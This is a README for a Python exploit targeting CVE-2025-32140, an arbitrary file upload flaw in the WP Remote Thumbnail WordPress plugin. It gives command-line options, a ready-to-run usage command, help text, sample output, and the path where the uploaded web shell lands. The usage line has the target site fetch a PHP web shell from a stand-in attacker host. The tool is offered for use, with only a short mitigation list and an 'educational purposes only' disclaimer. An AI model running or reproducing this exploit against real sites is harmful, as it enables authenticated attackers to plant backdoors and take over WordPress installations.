# 🚨 CVE-2025-32140 – WP Remote Thumbnail Exploit (Arbitrary File Upload)

---

## 📝 Description

**CVE-2025-32140** is a **critical vulnerability** in the **WP Remote Thumbnail** plugin for WordPress. It enables **authenticated attackers** (with contributor or higher permissions) to upload **arbitrary files**, such as **web shells**, by abusing a flawed feature that accepts unsanitized URLs.

The plugin fails to validate the file type or content fetched from the provided `remote_thumb` URL. This allows attackers to save malicious PHP files (e.g., backdoors) into the `/wp-content/uploads` directory.

---

## ⚠️ Vulnerable Component

- **Plugin**: WP Remote Thumbnail
- **Vulnerable Versions**: <= 1.3.2
- **Patched Version**: *Not yet released*
- **Attack Vector**: Network
- **Privileges Required**: Low (Authenticated user with `edit_post` capability)
- **CVSS Score**: **9.9 (Critical)**

---

## 🛠 Exploit Script

This Python script automates the exploitation of **CVE-2025-32140**, performing the following steps:

1. Logs into the target WordPress site.
2. Automatically extracts required nonces.
3. Crafts and sends a malicious request via the `remote_thumb` parameter.
4. Uploads a web shell to the target site.

---

## 🔧 Command-Line Options

| **Option**      | **Alias** | **Description**                                                                 |
|------------------|-----------|---------------------------------------------------------------------------------|
| `--url`         | `-u`      | Target WordPress site URL (e.g., `http://target.com/wordpress`)                 |
| `--username`    | `-un`     | WordPress username with post editing privileges                                |
| `--password`    | `-p`      | Password for the specified username                                            |
| `--user_ID`     | `-uid`    | WordPress User ID (usually `1` for admin)                                      |
| `--post_ID`     | `-pid`    | ID of the post to be edited (can be a draft)                                   |
| `--shell`       |           | Direct URL to a PHP web shell hosted on the attacker's server                  |

---

## 🚀 Usage

```bash
python CVE-2025-32140.py -u http://target.com/wordpress -un admin -p admin -uid 1 -pid 631 --shell http://attacker.com/shell.php
```
## 📖 Usage & Help
```bash

                                                                                                                
usage: CVE-2025-32140.py [-h] --url URL --username USERNAME --password PASSWORD --user_ID USER_ID --post_ID POST_ID --shell SHELL

Exploit For CVE-2025-32140 # By: Nxploited | Khaled Alenazi

options:
  -h, --help            show this help message and exit
  --url, -u URL         Target WordPress site URL (e.g., http://192.168.100.74:888/wordpress)
  --username, -un USERNAME
                        Username
  --password, -p PASSWORD
                        Password
  --user_ID, -uid USER_ID
                        User ID (usually 1 for admin)
  --post_ID, -pid POST_ID
                        Target post ID
  --shell SHELL         URL of the shell to be uploaded (e.g., http://attacker.com/shell.php)

```
---

## 📋 Example Output

```bash
[+] Logged in successfully.
[+] Cookies set successfully.
[DEBUG] Extracted _wpnonce: b4ef78e77d
[DEBUG] Extracted meta-box-order-nonce: 0c192fe62e
[DEBUG] Extracted closedpostboxesnonce: 52be514040
[DEBUG] Extracted samplepermalinknonce: 7b213c6597
[DEBUG] Extracted wprthumb_nonce: 45803ee312
[DEBUG] Extracted X-WP-Nonce: None
[+] Exploit POST sent successfully. Check your uploads directory.
By: Nxploited ( Khaled Alenazi ) | https://github.com/Nxploited

```

---

## 📂 Shell Location

Once exploited, the uploaded web shell will likely be stored at:

```
http://target.com/wordpress/wp-content/uploads/YYYY/MM/shell.php
```

Replace `YYYY/MM` with the **current year and month** of upload.

---

## 🛡 Recommendations

To mitigate the risk posed by this vulnerability:

1. **Update the plugin** to the latest version (once a patch is released).
2. Restrict file upload capabilities to **trusted users only**.
3. Disable the **remote thumbnail fetch** feature if it is not required.

---

## ⚠️ Disclaimer

> **This script is provided for educational purposes only.**  
> **The author is not responsible for any misuse or damage caused by this exploit.**

---

## 👤 Author

*By: [Nxploited ( Khaled Alenazi )](https://github.com/Nxploited)* 🌟
